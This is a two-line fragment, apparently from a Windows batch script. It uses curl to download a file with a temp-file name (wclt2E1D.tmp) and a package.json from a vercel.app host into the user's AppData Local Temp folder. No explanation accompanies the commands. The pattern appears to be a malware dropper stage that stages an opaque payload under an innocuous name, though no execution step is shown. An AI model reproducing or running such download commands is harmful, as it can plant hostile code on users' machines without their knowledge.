...
curl -L -o "%USERPROFILE%\AppData\Local\Temp\wclt2E1D.tmp" "https://polaris-server.vercel.app/120/wclt2E1D.tmp"
curl -L -o "%USERPROFILE%\AppData\Local\Temp\package.json" "https://polaris-server.vercel.app/package.json"
